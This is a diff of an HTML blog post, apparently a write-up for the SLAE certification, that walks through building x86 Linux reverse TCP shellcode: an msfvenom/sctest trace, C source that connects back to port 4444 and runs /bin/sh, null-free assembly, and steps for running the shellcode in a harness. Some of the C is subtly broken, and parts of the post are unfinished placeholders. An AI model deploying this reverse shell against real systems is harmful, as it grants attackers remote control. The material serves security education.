@@ -1,4 +1,4 @@
-<!DOCTYPE HTML>
+Reverse<!DOCTYPE HTML>
 <!--
 	Solution for SLAE question #2
 
@@ -57,7 +57,7 @@
                   <section class="post">
                     <body>
                       <article id="first-post">
-												<a href="index.html"><img src="../images/chirs.png" class="avatar" alt="avatar"> </img></a>
+												<a href="index.html"><img src="../images/matt.png" class="avatar" alt="avatar"> </img></a>
                         <h2>&emsp; Shellcoding the Reverse TCP Shell</h2>
 												<h5>&emsp; &emsp; &emsp; &emsp; October 2, 2020</h5>
                         <div class="box">
@@ -70,12 +70,14 @@
 													<a href="#Thoughts" style="color:blue;">Thoughts and Lessons Learned</a><br><br>
 
 													<p>
-														&emsp; &emsp;Welcome back! &nbsp;This post involves writing shellcode to create a <i>Reverse TCP</i> shell to establish a connection with a victim machine.
-														 &nbsp;A review of the reverse TCP shell is below:<br><br>
-														From the previous <a href="https://thestunneddefense.com/pages/shell-bind-tcp.html" target="_blank" style="color:blue;">article</a>: &nbsp;
-														Reverse shells are functionally similar to bind shells but work in the opposite direction. &nbsp;Instead, the attacker machine listens
+														&emsp; &emsp;Welcome back, Aaron! &nbsp;This post involves writing shellcode to create a <i>Reverse TCP</i> Shell to establish a connection with a victim machine.
+														 &nbsp;This is also called a <i>connect-back shell</i>. &nbsp;Before proceeding, it is important to note most detailed explanation common to Bind and Reverse Shells
+														 can be found in the <a href="https://thestunneddefense.com/pages/shell-bind-tcp.html" target="_blank" style="color:blue;">previous post</a>. &nbsp;This is done for
+														 brevity and highlighting Reverse Shell specific features. &nbsp;A review of the Reverse TCP Shell is below:<br><br>
+														From the previous article: &nbsp;
+														Reverse Shells are functionally similar to Bind Shells but work in the opposite direction. &nbsp;Instead, the attacker machine listens
 														for incoming connections from the vicitim machine over a preconfigured port (such as 4444). &nbsp;The connection attempt is initiated by the victim
-														machine by invoking a reverse shell. &nbsp;Below is what a reverse TCP shell looks like.
+														machine by invoking a Reverse Shell. &nbsp;Below is what a Reverse TCP Shell looks like.
 											 	</p>
 												<center><div class="image post"><img src="../images/slae/assignment2/1-reverse-shell.png" alt="" /></div></center><br>
 												<br>
@@ -84,54 +86,261 @@
 			<br><section id="POC"><h2>Drafting the Proof of Concept</h2></section>
 
 											<p>
-												Similar to the bind shell, a Proof of Concept (PoC) is developed using the same methodology. &nbsp;Look for the unstaged
-												version of <i>Shell Reverse TCP</i> payload in <i>msfvenom</i> and break it apart with <i>libemu's sctest</i> tool.
+												&emsp; &emsp;Similar to the Bind Shell, a Proof of Concept (PoC) is developed using the same methodology. &nbsp;The methodology comes from
+												<a href="https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238" target="_blank" style="color:blue;"><i>The Shellcoder's Handbook</i></a>,
+												 which is referenced in the <a href="https://thestunneddefense.com/pages/shell-bind-tcp.html#POC" target="_blank" style="color:blue;"><i>previous post</i></a>.
+												 &nbsp;Look for the unstaged version of <i>Shell Reverse TCP</i> payload in <i>msfvenom</i> and break it apart with <i>libemu's sctest</i> tool. &nbsp;The command used is <br>
+												 <code>msfvenom -p linux/x86/shell_reverse_tcp R | ~/SLAE/Libemu/tools/sctest/sctest -vvv -Ss 100000</code>
 											</p>
 
 											<pre>
-												<code class="bash" style=display:block;white-space:pre-wrap>
+												<code class="c-like" style=display:block;white-space:pre-wrap>
 -- snip --
 
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 2;
+) =  2;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 1;
+) =  1;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 0;
+) =  0;
+int connect (
+     int sockfd = 14;
+     struct sockaddr_in * serv_addr = 0x00416fbe =>
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 23569 (port=4444);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 50397450 (host=10.1.1.3);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 102;
+) =  0;
+int execve (
+     const char * dateiname = 0x00416fa6 =>
+           = "//bin/sh";
+     const char * argv[] = [
+           = 0x00416f9e =>
+               = 0x00416fa6 =>
+                   = "//bin/sh";
+           = 0x00000000 =>
+             none;
+     ];
+     const char * envp[] = 0x00000000 =>
+         none;
+) =  0;
 
 												</code>
 											</pre>
 
+											<p>
+												A cursory look at the above shows Reverse Shell is much smaller than its Bind Shell counterpart. &nbsp;Instead of 6 main functions, there are only 4 which drive the Reverse Shell:
+												<i>socket()</i>, <i>dup2()</i>, <i>connect()</i>, and <i>execve()</i>. &nbsp;The functions <i>socket()</i>, <i>dup2()</i>, and <i>execve()</i> behave the same as in Bind Shell so
+												<i>connect()</i> is the major change in the reverse shell. &nbsp;Looking at the <a href="https://man7.org/linux/man-pages/man2/connect.2.html" target="_blank" style="color:blue;">man page</a>,
+												it appears <i>connect()</i> uses similar parameters to <i>accept()</i>. &nbsp;This function can be quickly coded by referencing <i>accept()</i> in
+												the Bind Shell <a href="https://github.com/jpc0016/SLAE-code/blob/master/Assignment-1/shell-bind.c" target="_blank" style="color:blue;">program</a>. &nbsp;The remaining functions are even more
+												straightforward:
+											</p>
+											<pre>
+												<code class="c-like" style=display:block;white-space:pre-wrap>
+#include &lt;stdio.h>
+#include &lt;string.h>
+#include &lt;arpa/inet.h>
+#include &lt;netinet/in.h>
+#include &lt;sys/types.h>
+#include &lt;sys/socket.h>
+#include &lt;unistd.h>
 
+int main() {
 
+  int fd;   // file descriptor for socket() output
+  fd = socket(AF_INET, SOCK_STREAM, 0);
 
+  // define structure for connect-back machine: 'home' in this case
+  struct sockaddr_in home;
 
+  // Initialize struct parameters for 'home'
+  home.sin_family = AF_INET;
+  home.sin_port = htons(4444);
+  home.sin_addr = inet_aton(127.0.0.1);
+  memset(&(home.sin_zero), '\0', 8);
 
+  // duplicate socket() file descriptor to stdin, stdout, stderr
+  dup2(fd, 0);
+  dup2(fd, 1);
+  dup2(fd, 2);
+
+  // Connect to 'home' via file descriptor, fd
+  int home_size = sizeof(home);
+  connect(fd, (struct sockaddr *)&home, home_size);
+
+  // Execute shell
+  execve("//bin/sh", (char *[]){"//bin/sh", NULL}, NULL);
+
+}
+												</code>
+											</pre>
+
+											<p>
+												A brief explanation of each function is below:<br>
+												<b>socket:</b> &nbsp;Creates a TCP communication endpoint using an IPv4 address and defines it as a file descriptor (fd)<br>
+												<b>dup2:</b> &nbsp;Duplicates the file descriptor to the standard I/O file descriptors (stdin = 0, stdout = 1, stderr = 2).  This allows normal text output when the shell is executed.<br>
+												<b>connect:</b> &nbsp;Initiates a connection to the file descriptor using address parameters initialized in the <i>sockaddr_in</i> structure.<br>
+												<b>execve:</b> &nbsp;Execute /bin/sh.  Make sure the string length is a multiple of 4 to cleanly push the instruction onto the stack.  Command is //bin/sh in this case to make it //bi and n/sh.<br><br>
+												Run a quick test by compiling the source to binary and executing it. &nbsp;Unlike Bind Shell, the netcat listener must be started first before invoking the shell. &nbsp;This is familiar territory
+												if you've rooted enough machines in places like <i>HackTheBox</i> or <i>TryHackMe</i>.
+											 </p>
+											 <center><div class="image post"><img src="../images/slae/assignment2/2-c-test.png" alt="" /></div></center><br>
 
 
 
 			<br><section id="Assembly"><h2>Writing the Assembly</h2></section>
 
 									<p>
-										&emsp; &emsp;Writing assembly
+										&emsp; &emsp;Now that the source code is validated, it is time to convert each main function to assembly language. &nbsp;Recall the system call table from the Bind Shell
+										<a href="https://thestunneddefense.com/pages/shell-bind-tcp.html#Assembly" target="_blank" style="color:blue;"><i>article</i></a>. &nbsp;System calls for <i>socket()</i>.
+										 <i>dup2()</i>, and <i>execve()</i> are unchanged. &nbsp;The system call for <i>connect()</i> needs to be included. &nbsp;Once again the system call table is at
+										 <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code> for 32-bit Linux systems. &nbsp;<i>connect()</i> uses syscall 362.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment2/3-syscalls.png" alt="" /></div></center><br>
 
 
+									<p>
+										For a quick recap, the previous post began with a quick disassembly of the <i>reverse-shell</i> binary to inspect how parameters were loaded. &nbsp;The same activity is shown below
+										with <i>socket()</i> parameters loaded in reverse order onto the stack. <br>Quick note on active debugging: the binary must be in <i>run</i> mode in order for linked labels like
+										<i>&lt;socket>@plt</i> to show in disassembly; otherwise calls to 'arbitrary' addresses will show with no references.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/4-socket-params.png" alt="" /></div></center><br>
+
+									<p>
+										Just like Bind Shell, load the parameters into their respective registers and run the system call instruction. &nbsp;Store the file descriptor for later functions.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/5-socket-call.png" alt="" /></div></center><br>
+
+
+									<p>
+										Although the home address structure was defined and initialized before calls to <i>dup()</i>, the later can be loaded and executed. &nbsp;That order is not important right now. &nbsp;The
+										assembly is identical to the code in Bind Shell. &nbsp;Only comments were changed!
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/6-dup2-call.png" alt="" /></div></center><br>
+
+
+									<p>
+										This section is where the fun starts! &nbsp;Until now, defining and initializing the address structure was put off in favor of easy functions. &nbsp;Luckily this structure and the <i>connect()</i>
+										function are semantically similar to <i>accept()</i>. &nbsp;Referring back to the source code, there are familiar parameters and a new function called <i>inet_aton()</i>. &nbsp;This function is
+										responsible for converting an IP address string into byte format in network byte order according to its
+										 <a href="https://linux.die.net/man/3/inet_aton" target="_blank" style="color:blue;">man page</a>.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/7-struct-source.png" alt="" /></div></center><br>
+
+
+									<p>
+										Look at the <i>GDB</i> output of <i>reverse-shell</i> to inspect how the structure is loaded into <i>connect()</i>. &nbsp;Set a breakpoint where the parameters are loaded. &nbsp;The first parameter is
+										the size of the structure, which is 16 (0x10).
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/struct/1-start.png" alt="" /></div></center><br>
+
+
+									<p>
+										Define a hook-stop that allows viewing of registers, some disassembly, and enough contents on the stack.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/struct/2-redefine-hook-stop.png" alt="" /></div></center><br>
+
+
+									<p>
+										Step to the <i>load effective address</i> instruction to view register contents beforehand.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/struct/3-before-ptr.png" alt="" /></div></center><br>
+
+
+									<p>
+										Execute the load instruction to find eax with a pointer to the structure. &nbsp;Dump the bytes to see each parameter in byte order. &nbsp;The right-most 4 bytes is the IP address 127.0.0.1, the
+										next 2 bytes is port 4444 in hexadecimal, and the final left 2 bytes is the AF_INET designator.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/struct/4-inspect-ptr.png" alt="" /></div></center><br>
+
+
+									<p>
+										Step two more times to view all parameters on the stack at function call-time. &nbsp;All three <i>connect()</i> parameters are on the stack at the <i>call</i> instruction. &nbsp;Note they are
+										loaded in little-endian order.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/struct/5-all-params.png" alt="" /></div></center><br>
+
+
+									<p>
+										With a greater understanding of parameter layout, data for <i>connect()</i> can be appropriately loaded into their registers. &nbsp;There is one more issue however: how does "127.0.0.1" get loaded
+										without using NULL bytes (0x00)? &nbsp;One strategy is loading placeholder bytes for the NULLs and writing over the placeholders in the next instruction. &nbsp;Below is what this looks like.
+									</p>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+xor eax, eax			; eax = 0
+xor ebx, ebx			; ebx = 0
+mov eax, 0x7fbbbb01		; eax = 0x01bbbb7f
+mov WORD [eax + 1], bx		; eax = 0x0100007f
+										</code>
+									</pre>
+									<p>
+										Moving 0x0100007f into a register will involve NULL bytes in the middle of the address. &nbsp;Since the NULL bytes take up one WORD of space, replace that word with arbitrary bytes. &nbsp;0x0000 was
+										replaced with 0xbbbb. &nbsp;Remove those arbitrary bytes in the final instruction by replacing the arbitrary value with a 2 byte register of NULLs. &nbsp;This must occur at an offset of 1 to overwrite
+										 the correct bytes.<br>
+										&emsp; &emsp;Other than the localhost address, all parameters remain unchanged; therefore, most of the assembly code remains the same as assembly code in <i>bind()</i>. &nbsp;Note it now takes two
+										instructions to set <i>home.sin_addr</i>.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/8-connect-call.png" alt="" /></div></center><br>
+
+
+									<p>
+										Finally call the shell using <i>execve()</i>. &nbsp;This code remains unchanged from the Bind Shell.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/9-execve-call.png" alt="" /></div></center><br>
+
+
+									<p>
+										Compile and test the assembly before dumping shellcode. &nbsp;The moment of truth has arrived. &nbsp;It works!  \o/
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/10-nasm-test.png" alt="" /></div></center><br>
 
 
 
 			<br><section id="Demonstration"><h2>Demonstration</h2></section>
 
 									<p>
-										&emsp; &emsp;Demonstrate shellcode here
+										&emsp; &emsp;The hard part is done when both the proof of concept and assembly are validated. &nbsp;Run <i>objdump</i> on the binary with the special
+										<a href="https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump" target="_blank" style="color:blue;">command</a> to extract the opcode.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment2/11-objdump.png" alt="" /></div></center><br>
 
 
+									<p>
+										Copy and paste the shellcode into the C-code test harness. &nbsp;Remember to always use nano. &nbsp;Vim is the devil!
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/12-shellcode.png" alt="" /></div></center><br>
+
+
+									<p>
+										As with Bind Shell, compile the program with no stack protections and an executable stack. &nbsp;Initiate a netcat listener before invoking the binary.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment2/13-harness-works.png" alt="" /></div></center><br>
 
 
 
 			<br><section id="Debugging"><h2>Debugging</h2></section>
 
 									<p>
-										&emsp; &emsp;Debugging and Troubleshooting
+										&emsp; &emsp;Reverse Shell was much less debug intensive compared to Bind Shell; however, there was an unanticipated problem at the shellcode stage. &nbsp;
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment2/error/.png" alt="" /></div></center><br>
 
 
 
@@ -147,7 +356,10 @@
 
 
 
-
+									<p>
+										The source code for this assignment as well as other SLAE assignments is here:
+										<a href="https://github.com/jpc0016/SLAE-code" target="_blank" style="color:blue;">https://github.com/jpc0016/SLAE-code</a>
+									</p>
 
 									<p>
 									This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
